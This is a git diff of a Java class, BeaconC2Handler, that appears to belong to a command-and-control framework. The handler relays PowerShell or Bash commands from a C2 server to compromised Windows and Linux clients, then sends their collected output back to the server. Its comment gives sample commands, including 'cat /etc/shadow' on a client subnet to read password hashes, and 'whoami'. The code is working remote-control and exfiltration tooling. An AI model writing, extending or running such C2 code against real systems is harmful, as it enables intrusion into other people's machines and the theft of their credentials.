@@ -75,16 +75,18 @@ public class BeaconC2Handler implements Runnable{
     @Override
     public void run(){
         /**
-         * Commands from the C2 Server are organized in a hierarchical structure
-         * Command to be sent to Computer
-         *      Either Windows or Linux
-         *          All Computers, or specific computer
-         * Request for Data from the Long Range Beacon
-         *      Client Responses
-         *          Either Windows or Linux
-         *              All computers, or specific computer
-         *      Client Status Updates
-         *          All, Windows, Linux, or Specific Computer
+         * Commands from the C2 Server are organized by two attributes
+         * Type - Command, Request, Status
+         * Scope - Windows, Linux, or IPv4 Address
+         * 
+         * Examples
+         * 
+         * Command Windows_Get-LocalUser
+         * Request Linux_
+         * Request 192.168.1.5_
+         * Scope All
+         * Command Linux_whoami
+         * Command 10.0.10.x_cat /etc/shadow
          */
 
         // Attempt to authenticate with the C2 Server. If authentication fails, gracefully close, and distribute the quit
@@ -114,83 +116,91 @@ public class BeaconC2Handler implements Runnable{
                     String[] tokens = tokensAndCommands[0].split(" ");
                     String verb = tokens[0];
                     String scope = tokens[1];
-                    String target = tokens[2];
                     String commands = tokensAndCommands[1];
                     if(tokens[0].equals("quit")){
                         break;
                     }
                     if(verb.equals("Command")){
-                        // If a message is a command, it will be in the format "Command [OS - Windows or Linux] [Scope - All or an IP Address]_[Powershell/Bash command to be run]"
-                        if(target.equals("All")){
-                            beaconServer.distributeCommands(tokens[1], commands);
-                        } else {
-                            beaconServer.distributeCommands(scope, commands);
-                        }
+                        // If a message is a command, it will be in the format "Command [Scope - Windows, Linux, or IPv4 Address]_[Powershell/Bash command to be run]"
+                        beaconServer.distributeCommands(scope, commands);
                     }
-                    // If a message is a request, it will be in the format "Request ClientData [Target - Windows or Linux] [Scope - All or an IP Address]_"
+                    // If a message is a request, it will be in the format "Request [Scope - Windows, Linux, or IPv4 Address]_"
                     else if(verb.equals("Request")){
                         StringBuilder responseToRequest = new StringBuilder();
                         if(scope.equals("ClientData")){
-                            // Windows Request
-                            if(target.equals("Windows")){
-                                if(tokens[3].equals("All")){
-                                    HashMap<String, ArrayList<String>> windowsClientResponseList = beaconServer.getMultipleClientResponses("Windows");
-                                    for (String IP : windowsClientResponseList.keySet()) {
-                                        responseToRequest.append("Client IP: ").append(IP).append("\n");
-                                        responseToRequest.append("Responses:\n");
+                            HashMap<String, ArrayList<String>> clientResponses = beaconServer.getClientResponses(scope);
+                            for (String IP : clientResponses.keySet()) {
+                                responseToRequest.append("Client IP: ").append(IP).append("\n");
+                                responseToRequest.append("Responses:\n");
+
+                                ArrayList<String> responses = clientResponses.get(IP);
+                                for (int i = 0; i < responses.size(); i++) {
+                                    String line = responses.get(i).trim(); // Trim to remove extra spaces or newlines
+                                    
+                                    // Only add if the line is not empty
+                                    if (!line.isEmpty()) {
+                                        responseToRequest.append(String.format("  %d. %s%n", i + 1, line));
+                                    }
+                                }
+                                responseToRequest.append("\n"); // Separate each client's response block with a newline
+                            }
+                            // if(target.equals("Windows")){
+                            //     if(tokens[3].equals("All")){
+                            //         HashMap<String, ArrayList<String>> windowsClientResponseList = beaconServer.getClientResponses("Windows");
+                            //         for (String IP : windowsClientResponseList.keySet()) {
+                            //             responseToRequest.append("Client IP: ").append(IP).append("\n");
+                            //             responseToRequest.append("Responses:\n");
     
-                                        ArrayList<String> responses = windowsClientResponseList.get(IP);
-                                        for (int i = 0; i < responses.size(); i++) {
-                                            String line = responses.get(i).trim(); // Trim to remove extra spaces or newlines
+                            //             ArrayList<String> responses = windowsClientResponseList.get(IP);
+                            //             for (int i = 0; i < responses.size(); i++) {
+                            //                 String line = responses.get(i).trim(); // Trim to remove extra spaces or newlines
                                             
-                                            // Only add if the line is not empty
-                                            if (!line.isEmpty()) {
-                                                responseToRequest.append(String.format("  %d. %s%n", i + 1, line));
-                                            }
-                                        }
-                                        responseToRequest.append("\n"); // Separate each client's response block with a newline
-                                    }
-                                }
-                                if (target.equals("Windows")) {
-                                    String IP = tokens[3];
-                                    HashMap<String, ArrayList<String>> windowsClientResponseList = beaconServer.getMultipleClientResponses("Windows");
+                            //                 // Only add if the line is not empty
+                            //                 if (!line.isEmpty()) {
+                            //                     responseToRequest.append(String.format("  %d. %s%n", i + 1, line));
+                            //                 }
+                            //             }
+                            //             responseToRequest.append("\n"); // Separate each client's response block with a newline
+                            //         }
+                            //     }
+                            //     if (target.equals("Windows")) {
+                            //         String IP = tokens[3];
+                            //         HashMap<String, ArrayList<String>> windowsClientResponseList = beaconServer.getMultipleClientResponses("Windows");
                                 
-                                    if (IP.equals("All")) {
-                                        for (String clientIP : windowsClientResponseList.keySet()) {
-                                            appendClientResponses(responseToRequest, clientIP, windowsClientResponseList.get(clientIP));
-                                        }
-                                    } else {
-                                        appendClientResponses(responseToRequest, IP, windowsClientResponseList.get(IP));
-                                    }
-                                } 
-                            }
-                            // Linux Request
-                            else if (target.equals("Linux")) {
-                                HashMap<String, ArrayList<String>> linuxClientResponseList = beaconServer.getMultipleClientResponses("Linux");
-                                for (String IP : linuxClientResponseList.keySet()) {
-                                    responseToRequest.append("Client IP: ").append(IP).append("\n");
-                                    responseToRequest.append("Responses:\n");
+                            //         if (IP.equals("All")) {
+                            //             for (String clientIP : windowsClientResponseList.keySet()) {
+                            //                 appendClientResponses(responseToRequest, clientIP, windowsClientResponseList.get(clientIP));
+                            //             }
+                            //         } else {
+                            //             appendClientResponses(responseToRequest, IP, windowsClientResponseList.get(IP));
+                            //         }
+                            //     } 
+                            // }
+                            // // Linux Request
+                            // else if (target.equals("Linux")) {
+                            //     HashMap<String, ArrayList<String>> linuxClientResponseList = beaconServer.getMultipleClientResponses("Linux");
+                            //     for (String IP : linuxClientResponseList.keySet()) {
+                            //         responseToRequest.append("Client IP: ").append(IP).append("\n");
+                            //         responseToRequest.append("Responses:\n");
     
-                                    ArrayList<String> responses = linuxClientResponseList.get(IP);
-                                    for (int i = 0; i < responses.size(); i++) {
-                                        String line = responses.get(i).trim(); // Trim to remove extra spaces or newlines
+                            //         ArrayList<String> responses = linuxClientResponseList.get(IP);
+                            //         for (int i = 0; i < responses.size(); i++) {
+                            //             String line = responses.get(i).trim(); // Trim to remove extra spaces or newlines
                                         
-                                        // Only add if the line is not empty
-                                        if (!line.isEmpty()) {
-                                            responseToRequest.append(String.format("  %d. %s%n", i + 1, line));
-                                        }
-                                    }
-                                    responseToRequest.append("\n"); // Separate each client's response block with a newline
-                                }
-                            }
-                            
+                            //             // Only add if the line is not empty
+                            //             if (!line.isEmpty()) {
+                            //                 responseToRequest.append(String.format("  %d. %s%n", i + 1, line));
+                            //             }
+                            //         }
+                            //         responseToRequest.append("\n"); // Separate each client's response block with a newline
+                            //     }
+                            // }
                             // Send the final response
-                            C2Server.send(responseToRequest.toString());
-                                
+                            C2Server.send(responseToRequest.toString());    
                         }
                     }
                     // Request Client Status
-                    else if(scope.equals("ClientStatus")){
+                    else if(verb.equals("Status")){
                         String responseToRequest;
                         responseToRequest = beaconServer.getClientStatus();
                         C2Server.send(responseToRequest);
